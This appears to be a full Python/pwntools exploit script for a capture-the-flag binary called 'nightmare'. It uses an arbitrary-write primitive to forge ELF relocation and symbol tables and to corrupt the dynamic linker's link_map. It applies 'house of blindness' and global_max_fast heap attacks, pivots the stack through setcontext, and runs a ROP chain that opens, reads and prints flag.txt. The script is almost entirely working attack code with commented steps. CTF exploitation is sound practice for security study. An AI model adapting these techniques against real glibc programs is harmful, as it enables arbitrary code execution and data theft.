#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./bin/nightmare")
libc = ELF("./lib/libc.so.6")
ld = ELF("./lib/ld-linux-x86-64.so.2")

context.update(binary=exe, terminal=["tmux", "splitw", "-v"])

# typedef struct {
#        Elf64_Word      st_name;
#        unsigned char   st_info;
#        unsigned char   st_other;
#        Elf64_Half      st_shndx;
#        Elf64_Addr      st_value;
#        Elf64_Xword     st_size;
# } Elf64_Sym;
elf64_sym = struct.Struct("<LBBHQQ")

# typedef struct {
#        Elf64_Addr      r_offset;
#        Elf64_Xword     r_info;
#        Elf64_Sxword    r_addend;
# } Elf64_Rela;
elf64_rela = struct.Struct("<QQq")


class link_map:
    DT_JMPREL = 23
    DT_SYMTAB = 6
    DT_STRTAB = 5
    DT_VER = 50
    DT_FINI = 13
    DT_PLTGOT = 3
    DT_FINI_ARRAY = 26
    DT_FINI_ARRAYSZ = 28

    def __init__(self, offset):
        self.offset = offset

    def l_addr(self):
        return ld.address + self.offset

    def l_info(self, tag):
        return ld.address + self.offset + 0x40 + tag * 8

    def l_init_called(self):
        return self.l_addr() + 0x31C


class rtld_global:
    def __init__(self, offset):
        self.offset = offset

    def _base(self):
        return self.offset

    def _dl_load_lock(self):
        return self.offset + 0x988

    def _dl_stack_used(self):
        return self.offset + 0x988

    def _dl_rtld_map(self):
        return self.offset + 0xA08


class io_obj:
    def __init__(self, offset):
        self.offset = offset

    def _flags(self):
        return self.offset

    def _IO_save_end(self):
        return self.offset + 0x58


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
    if args.DUMP:
        r = process("cat > dump.txt", shell=True)
    else:
        r = remote("localhost", 5001)
    return r


ld.address = 0x270000 - 0x10
libc.address = 0x43000 - 0x10

binary_map = link_map(0x36220)
ld_map = link_map(0x35A48)

_rtld_global = rtld_global(ld.symbols["_rtld_global"])


def write(offset, bytes):
    for i, byte in enumerate(bytes):
        r.send(p64(offset + i, signed=True))
        r.send(p8(byte))


def set_rela_table(table):
    write(
        ld.symbols["_r_debug"],
        table,
    )
    # set reloc table to _r_debug
    write(binary_map.l_info(link_map.DT_JMPREL), p8(0xB8))


def set_sym_table(table):
    write(ld.symbols["_r_debug"] + elf64_sym.size * 2, table)
    write(binary_map.l_info(link_map.DT_SYMTAB), p8(0xB8))


def restore_rela_table():
    write(binary_map.l_info(link_map.DT_JMPREL), p8(0xF8))


def restore_sym_table():
    write(binary_map.l_info(link_map.DT_SYMTAB), p8(0x88))


# implements house of blindness to call a function
def call_fn(fn, arg=b""):
    write(
        binary_map.l_addr(),
        p64(fn - ld.symbols["_r_debug"], signed=True),
    )
    write(_rtld_global._dl_load_lock(), arg)
    write(binary_map.l_init_called(), p8(0xFF))


def page_boundary(size):
    return (size + 0x1000) >> 12 << 12


def malloc(size):
    assert size % 2 == 0
    old_size = int((size - 100) / 2)

    file = FileStructure()
    file._IO_buf_end = old_size
    file._IO_write_ptr = old_size + 1
    file._IO_read_ptr = 0xFFFFFFFFFFFFFFFF
    file._IO_read_end = 0xFFFFFFFFFFFFFFFF
    call_fn(libc.symbols["_IO_str_overflow"], bytes(file)[:0x48])
    # make sure __rtld_mutex_unlock goes without a hitch by setting invalid _kind
    write(_rtld_global._dl_load_lock() + 0x10, p8(0xFF))
    return size


def free():
    call_fn(libc.symbols["_IO_str_finish"])


# global_max_fast ow implementation
page_mem_alloc = 0


def gmf_size(offset):
    return (offset - libc.symbols["main_arena"] + 0x8) * 2 - 0x10


def ptr_write(offset):
    global page_mem_alloc
    # use global_max_fast attack to overwrite
    write(offset, p64(0))
    size = gmf_size(offset)
    A = malloc(size)
    write(libc.symbols["global_max_fast"], p64(0xFFFFFFFFFFFFFFFF))
    # write chunk header
    write(-page_boundary(A) - 8 - page_mem_alloc, p64(size | 1))
    # write fake chunk header for next check
    write(-page_boundary(A) + size - 0x8 - page_mem_alloc, p8(0x50))
    page_mem_alloc += page_boundary(A)
    # write fastbin addr
    free()
    write(libc.symbols["global_max_fast"], p64(0))
    return -page_mem_alloc


r = conn()

# ----------- loop program -----------
# l_addr is always mmap aligned, meaning that the last three nibbles is always 000.
# changing the lsb allows us to add some constant offset to l_addr
# when write@got is resolved, it'll write write@libc to &write@got.
# &write@got is calculated as l_addr + reloc offset, so we can
# write@libc to &exit@libc to cancel exit.
# because of gcc optimizations, no ret is after exit. we'll slide into main,
# which will slide into csu init. that'll call constructors, looping the process.

l_addr_offset = exe.got["_Exit"] - exe.got["write"]
write(binary_map.l_addr(), p8(l_addr_offset))

# ----------- clear version info -----------
# version info will restrict what libraries we can load symbols from, it's a new feature in elfs
# old elfs don't have this feature, so just need to trick ld by clearing the version info ptr
# to remove versioning info, we need to get a static relocation that doesnt access version while we overwrite it

# these are some dummy entires which will just write the address of _init way past the binaries GOT
set_rela_table(elf64_rela.pack(0x4100, 0x200000007, 0))
set_sym_table(elf64_sym.pack(0, 0x12, 1, 0, exe.symbols["_init"] - l_addr_offset, 0))
# now, resolving write won't access version info
write(binary_map.l_info(link_map.DT_VER), p64(0))
# reset sym/rela tables
restore_sym_table()
restore_rela_table()


# ----------- replace write@got with _dl_fini -----------
# we need to forge a libc symbol so that we can overwrite write@got with _dl_fini
# to do this, we'll swap out _dl_x86_get_cpu_features's symtable entry with our own, which will resolve to _dl_fini
# to write it to write@got, we'll forge a rela entry for _dl_fini, telling it to write the resolution to write@got

# first, disable destructors from running once we do call _dl_fini. we don't want them to exec mid write.
write(binary_map.l_init_called(), p8(0))
# overwrite lsb of DT_SYMTAB to reference ld's GOT instead of binary's symtab
# the 9th entry should be in a writeable section, right after the GOT
write(
    ld.symbols["_GLOBAL_OFFSET_TABLE_"] + elf64_sym.size * 8,
    elf64_sym.pack(0x166, 0x12, 0x0, 0xD, ld.symbols["_dl_fini"] - ld.address, 0xC),
)
write(ld_map.l_info(link_map.DT_SYMTAB), p8(0xE0))
# we'll attack the 9th symtab entry, _dl_x86_get_cpu_features. to do this, we swap out the strtable of the binary with our own.
# instead of reading write at strtable+0x4b, it'll read _dl_x86_get_cpu_features
write(ld.symbols["_r_debug"] + 0x4B, b"_dl_x86_get_cpu_features")
# move resolve _dl_x86_get_cpu_features instead of write
write(binary_map.l_info(link_map.DT_STRTAB), p8(0xB8))
# write resolution to write
set_rela_table(elf64_rela.pack(exe.got["write"] - l_addr_offset, 0x200000007, 0))
# cool! let's bring back our rela table.
restore_rela_table()


# ----------- house of blindness setup -----------
# let's restore l_addr
write(binary_map.l_addr(), p8(0))
# DT_FINI should point at _r_debug
write(binary_map.l_info(link_map.DT_FINI), p8(0xB8))
# make sure DT_FINI_ARRAY doesn't execute
write(binary_map.l_info(link_map.DT_FINI_ARRAY), p64(0))
# make sure __rtld_mutex_unlock gives up by setting invalid _kind
write(_rtld_global._dl_load_lock() + 0x10, p8(0xFF))

# ----------- fake linkmap for _dl_fixup -----------
fake_linkmap = link_map(_rtld_global._dl_load_lock() - ld.address)
symtab_dyn = ptr_write(fake_linkmap.l_info(link_map.DT_SYMTAB))

# ----------- double free to make symtab struct for _dl_fixup -----------
fake_io = io_obj(_rtld_global._dl_load_lock())
# when the swap happens, we still need 0xff at the mutex
write(fake_io._IO_save_end(), p8(0xFF))
# _IO_switch_to_backup_area switches read with save
call_fn(libc.symbols["_IO_switch_to_backup_area"])
# make size of chunk tcache so memstream takes from it
write(symtab_dyn - 0x8, p64(0x200 | 1))
# trick io into thinking we aren't actually swapped
write(fake_io._flags(), p64(0))
# # _IO_free_backup_area will free _IO_save_base, but this time the ptr will end up in tcache
call_fn(libc.symbols["_IO_free_backup_area"])
# pull from tcache and write ptrs into mmap
call_fn(libc.symbols["__open_memstream"])
# move mmap ptr to mmap relative ptr
write(fake_linkmap.l_info(link_map.DT_SYMTAB), p8(0x90))
symtab = symtab_dyn + 0x110

# ----------- complete linkmap for _dl_fixup -----------
strtab = ptr_write(fake_linkmap.l_info(link_map.DT_STRTAB))
pltgot = ptr_write(fake_linkmap.l_info(link_map.DT_PLTGOT))
write(pltgot - 0x8, p64(0))
# jmprel dyn points to right above the got. move it to point to the got.
write(fake_linkmap.l_info(link_map.DT_JMPREL), p8(0xF8))
# now, d_ptr will be an mmaped chunk written to got
jmprel = ptr_write(ld.symbols["_GLOBAL_OFFSET_TABLE_"])
addr = ptr_write(fake_linkmap.l_addr())


def rel_write(where, what):
    write(jmprel + 0x8, elf64_rela.pack(where - addr + 0x10, 0x000000007, 0))
    write(symtab - 0x10, elf64_sym.pack(0, 0x12, 1, 0, what - addr + 0x10, 0))
    call_fn(ld.symbols["_dl_fixup"])


# ----------- stack pivot -----------
# using rdx gadget found at https://www.willsroot.io/2020/12/yet-another-house-asis-finals-2020-ctf.html
# 0x0000000000169e90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
rbx_write_call = libc.address + 0x169E90
# set rbx to a ptr to our original mmap page
rel_write(_rtld_global._dl_load_lock() + 8, 0)
# write what to call, setcontext gadget, to rdx + 0x20
rel_write(0x20, libc.symbols["setcontext"] + 61)
# write where to pivot, original_mmap+0x100 to rbx + 0xa0
rel_write(0xA0, 0x100)
# rdx + a8 is pushed, so we need a ret gadget here
rel_write(0xA8, libc.symbols["setcontext"] + 334)

# ----------- rop chain -----------
rop = ROP(libc)
write(ld.symbols["_r_debug"], b"flag.txt\x00")
# open, read, write
rop.call(
    "syscall",
    [
        constants.linux.amd64.SYS_open,
        ld.symbols["_r_debug"],
        0,
    ],
)
rop.call(
    "syscall",
    [
        constants.linux.amd64.SYS_read,
        3,
        ld.symbols["_r_debug"],
        64,
    ],
)
rop.call(
    "syscall",
    [
        constants.linux.amd64.SYS_write,
        constants.STDOUT_FILENO,
        ld.symbols["_r_debug"],
        64,
    ],
)


# this is so hacky and so wrong but i do not care
def is_ptr(ptr):
    return ptr > 0x1000


for i, gadget in enumerate(rop.build()):
    if isinstance(gadget, bytes):
        write(0x100 + i * 8, gadget)
    elif is_ptr(gadget):
        rel_write(0x100 + i * 8, gadget)
    else:
        write(0x100 + i * 8, p64(gadget))

# ----------- win -----------
call_fn(rbx_write_call)
